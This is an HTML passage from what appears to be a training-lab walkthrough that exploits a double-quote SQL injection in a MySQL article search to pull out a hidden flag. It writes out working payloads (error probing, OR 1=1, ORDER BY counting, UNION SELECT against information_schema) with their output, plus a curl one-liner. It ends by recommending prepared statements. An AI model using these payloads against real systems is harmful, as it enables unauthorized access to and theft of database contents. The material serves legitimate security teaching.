<h4>Step 1: Detect the Injection Point</h4>
<p>
    Enter a double quote <code>"</code> in the Author field.
    You should see a MySQL syntax error: this confirms the input is wrapped
    in <strong>double quotes</strong> instead of the usual single quotes.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Trigger Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>"<br><br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near <strong>'"" AND id &gt; 0'</strong> at line 1
    </div>
</div>

<p>
    The error leaks the query structure: <code>WHERE author = "" AND id > 0</code>.
    The delimiter is double quotes, and there's an <code>id > 0</code> filter.
</p>

<h4>Step 2: Confirm Injection with Boolean Test</h4>
<p>
    Enter <code>" OR 1=1 -- -</code>. The double quote closes the string,
    <code>OR 1=1</code> makes the WHERE true for all rows, and <code>-- -</code> comments out the rest.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>" OR 1=1 -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> Getting Started with SQL &bull; <strong>Author:</strong> alice<br>
        <strong>Title:</strong> Advanced JOIN Techniques &bull; <strong>Author:</strong> alice<br>
        <strong>Title:</strong> Database Normalization Guide &bull; <strong>Author:</strong> bob<br>
        <strong>Title:</strong> Indexing Best Practices &bull; <strong>Author:</strong> bob<br>
        <strong>Title:</strong> Securing Your Database &bull; <strong>Author:</strong> charlie<br>
        <strong>Title:</strong> Backup and Recovery Strategies &bull; <strong>Author:</strong> charlie<br>
        <strong>Title:</strong> DRAFT: Internal Security Audit &bull; <strong>Author:</strong> editor<br>
        (all 7 articles returned)
    </div>
</div>

<p>
    Notice the "editor" author has a draft article: that's our target.
</p>

<h4>Step 3: Determine Columns and Discover Hidden Fields</h4>
<p>
    Find the column count, then enumerate the <code>articles</code> table
    structure to find hidden columns.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Column Count + Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>" ORDER BY 3 -- -&nbsp;&nbsp;&nbsp; &#10004; works (3 columns)<br>
        <span class="prompt">Input: </span>" ORDER BY 4 -- -&nbsp;&nbsp;&nbsp; &#10008; error<br><br>
        <span class="prompt">Input: </span>" UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name="articles" -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> id &bull; <strong>Author:</strong><br>
        <strong>Title:</strong> title &bull; <strong>Author:</strong><br>
        <strong>Title:</strong> author &bull; <strong>Author:</strong><br>
        <strong>Title:</strong> content &bull; <strong>Author:</strong><br>
        <strong>Title:</strong> <strong>draft_flag</strong> &bull; <strong>Author:</strong>
    </div>
</div>

<p>
    There's a hidden <code>draft_flag</code> column not displayed in the normal query!
</p>

<h4>Step 4: Extract the Draft Flag</h4>
<p>
    Use <code>UNION SELECT</code> to pull the <code>draft_flag</code> from the editor's article.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract the Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>" UNION SELECT draft_flag, author, title FROM articles WHERE author="editor" -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> FLAG{d0ubl3_qu0t3_3sc4p3} &bull; <strong>Author:</strong> editor<br>
        <strong>Content:</strong> DRAFT: Internal Security Audit
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy <code>FLAG{d0ubl3_qu0t3_3sc4p3}</code> and paste it into the verification form.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab4" \<br> --data-urlencode 'author=" UNION SELECT draft_flag, author, title FROM articles WHERE author="editor" -- -'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQL injection is not limited to single quotes.
    MySQL accepts <strong>double quotes</strong> as string delimiters when
    <code>ANSI_QUOTES</code> mode is not enabled (the default). Always use
    prepared statements: they handle quoting automatically regardless of delimiter style.
    Testing only for single-quote injection in WAFs leaves double-quote injection wide open.
</div>
